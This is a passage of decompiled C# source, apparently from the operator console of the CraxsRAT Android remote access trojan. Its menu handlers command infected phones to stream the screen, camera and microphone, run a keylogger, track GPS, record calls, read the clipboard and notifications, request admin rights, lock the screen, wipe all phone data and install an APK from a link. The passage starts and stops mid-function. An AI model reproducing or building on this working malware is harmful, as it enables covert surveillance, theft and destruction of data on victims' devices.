			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private void ScreenMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Live_Screen_" + client.ClientRemoteAddress;
						ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
						if (screenShoter == null)
						{
							screenShoter = new ScreenShoter();
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
							screenShoter.Tag = client.ClientRemoteAddress;
							screenShoter.classClient = client;
							screenShoter.Client = client.myClient;
							screenShoter.DownloadsFolder = client.FolderUSER;
							screenShoter.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ScreenReaderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Screen_Reader_" + client.ClientRemoteAddress;
						ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
						if (screenReader == null)
						{
							screenReader = new ScreenReader();
							screenReader.Name = name;
							screenReader.Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP);
							screenReader.Tag = client.ClientRemoteAddress;
							screenReader.Classclient = client;
							screenReader.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void CameraMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					int num = 0;
					int num2 = 0;
					if (client.Isv4)
					{
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
					else
					{
						string name = "Camera_Manager_" + client.ClientRemoteAddress;
						CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
						if (cameraManager != null)
						{
							break;
						}
						cameraManager = new CameraManager();
						cameraManager.Name = name;
						cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
						cameraManager.classClient = client;
						if (cameraManager.classClient != null)
						{
							reso.Directory_Exist(cameraManager.classClient);
							cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
						}
						cameraManager.Client = client.myClient;
						cameraManager.classCamera = client;
						cameraManager.TempImage = new PictureBox();
						cameraManager.combotext.Visible = false;
						cameraManager.combosizes.Visible = false;
						cameraManager.Show();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void MicrophoneMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					TcpClient myClient = client.myClient;
					string name = "Microphone_" + client.ClientRemoteAddress;
					Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
					if (microphone == null)
					{
						string[] array = client.Keys.Split(':');
						if (array.Length < infoServer.KeySize)
						{
							break;
						}
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						string name = "Keylogger_" + client.ClientRemoteAddress;
						Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
						if (client != null && keylogger == null)
						{
							keylogger = new Keylogger();
							keylogger.Name = name;
							keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
							keylogger.Client = client.myClient;
							keylogger.classClient = client;
							keylogger.DGV0.Columns[3].Width = 48;
							keylogger.DGV0.Columns[3].DisplayIndex = 0;
							keylogger.tmpAddressIP = client.ClientAddressIP;
							keylogger.tmpClientName = client.ClientName;
							keylogger.tmpCountry = client.Country;
							keylogger.tmpFolderUSER = client.FolderUSER;
							client.Keylogg = true;
							keylogger.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void LiveModeToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void SilentModeGOIPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					string[] latLng = Data.cityclass.GetLatLng(client.ClientAddressIP);
					if (latLng == null)
					{
						continue;
					}
					string name = "Location_Manager_" + client.ClientRemoteAddress;
					LocationManager locationManager = (LocationManager)MyProject.Application.OpenForms[name];
					if (locationManager == null)
					{
						reso.Directory_Exist(client);
						locationManager = new LocationManager();
						locationManager.infoMaps = new string[2] { client.FolderUSER, client.ClientName };
						locationManager.Name = name;
						locationManager.Title = string.Format("{0} - IP:{1}", "Location Manager", client.ClientAddressIP);
						locationManager.Client = client.myClient;
						locationManager.classClient = client;
						locationManager.Issilent = true;
						locationManager.tmpFolderUSER = client.FolderUSER;
						if (!Directory.Exists(locationManager.tmpFolderUSER))
						{
							Directory.CreateDirectory(locationManager.tmpFolderUSER);
						}
						locationManager.Show();
						locationManager.Zoom = 15;
					}
					locationManager.ImageSize.Width = 480;
					locationManager.ImageSize.Height = 360;
					locationManager.Markers = reso.Between("<param name=\"markers_gsm\">", "</param>");
					locationManager.Link = "https://api.mapbox.com/styles/v1/";
					locationManager.Key = "pk.REDACTED_MAPBOX_PUBLIC_TOKEN";
					string text = reso.Maps_style();
					locationManager.style = reso.Between("<param name=\"" + text + "\">", "</param>");
					locationManager.Accuracy = "jump";
					locationManager.Speed = "jump";
					locationManager.List.Add(new double[2]
					{
						Conversions.ToDouble(latLng[0]),
						Conversions.ToDouble(latLng[1])
					});
					locationManager.Text = locationManager.Title;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void WebBrowserToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Web_Browser_" + client.ClientAddressIP;
						WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
						if (webViewMonitor == null)
						{
							webViewMonitor = new WebViewMonitor();
							webViewMonitor.Name = name;
							webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
							webViewMonitor.Tag = client.ClientAddressIP;
							webViewMonitor.Classclient = client;
							webViewMonitor.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void CallRecorderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Calls_Records_" + client.ClientAddressIP;
						Calls_Records calls_Records = (Calls_Records)MyProject.Application.OpenForms[name];
						if (calls_Records == null)
						{
							calls_Records = new Calls_Records();
							calls_Records.Name = name;
							calls_Records.Title = string.Format("{0} - IP:{1}", "Calls Records", client.ClientAddressIP);
							calls_Records.Tag = client.ClientRemoteAddress;
							calls_Records.ClassClient = client;
							calls_Records.Client = client.myClient;
							calls_Records.DownloadsFolder = client.FolderUSER;
							calls_Records.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Auto_Clicker_" + client.ClientRemoteAddress;
						Auto_Clicker auto_Clicker = (Auto_Clicker)MyProject.Application.OpenForms[name];
						if (auto_Clicker != null)
						{
							break;
						}
						auto_Clicker = new Auto_Clicker();
						auto_Clicker.Name = name;
						auto_Clicker.Classclient = client;
						auto_Clicker.Show();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void RequestAdminRightsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							string[] array = client.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								string.Concat(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>", Data.SPL_SOCKET, array[0], Data.SPL_SOCKET, array[1], Data.SPL_SOCKET, SecurityKey.Lockscreen, Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Data.SPL_ARRAY, Data.SPL_SOCKET, client.ClientRemoteAddress),
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void LockScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							string[] array = client.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>lck<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						switch (Interaction.MsgBox("All Phone Data Will be Removed\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert"))
						{
						case MsgBoxResult.No:
							return;
						case MsgBoxResult.Yes:
						{
							string[] array = client.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>wip<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
							break;
						}
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					TcpClient myClient = client.myClient;
					CallPhone callPhone = new CallPhone();
					callPhone.L0.Text = "add Number";
					callPhone.StartPosition = FormStartPosition.Manual;
					callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
					string text = null;
					string text2 = null;
					if (callPhone.ShowDialog() == DialogResult.OK)
					{
						text = callPhone.TextBox1.Text;
						text2 = callPhone._Call;
						callPhone.Close();
						if (Operators.CompareString(text, null, TextCompare: false) == 0)
						{
							continue;
						}
						try
						{
							if (client != null)
							{
								object[] parametersObjects = new object[4]
								{
									myClient,
									SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + text2 + Data.SPL_DATA + "tel:" + text.Trim(),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
						finally
						{
						}
						continue;
					}
					callPhone.Close();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter APK Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
						{
							break;
						}
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + reso.ChekLink(dialog.Mytext.Text) + ":up" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Messege";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
						{
							break;
						}
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
						{
							break;
						}
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void NotificationListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Notifications_" + client.ClientAddressIP;
						Craxspopup craxspopup = (Craxspopup)MyProject.Application.OpenForms[name];
						if (craxspopup == null)
						{
							craxspopup = new Craxspopup();
							craxspopup.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
							craxspopup.ClassClient = client;
							craxspopup.Show();
							selectedRow.Cells[8].Value = Codes.BlankImage();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void CallsListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Calls_Log_" + client.ClientAddressIP;
						craxscallslog craxscallslog2 = (craxscallslog)MyProject.Application.OpenForms[name];
						if (craxscallslog2 == null)
						{
							craxscallslog2 = new craxscallslog();
							craxscallslog2.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
							craxscallslog2.ClassClient = client;
							selectedRow.Cells[9].Value = Codes.BlankImage();
							craxscallslog2.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void SocialMediaHanterToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							CraxsAlert.Showinformation("the tool is under maintenance ");
							break;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void PhoneInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Information + Data.SPL_SOCKET + "information",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem15_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							CraxsAlert.Showinformation("the tool is under maintenance ");
							break;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem16_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
							client.Close(myClient);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem17_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							client.Blockme(client.ClientAddressIP);
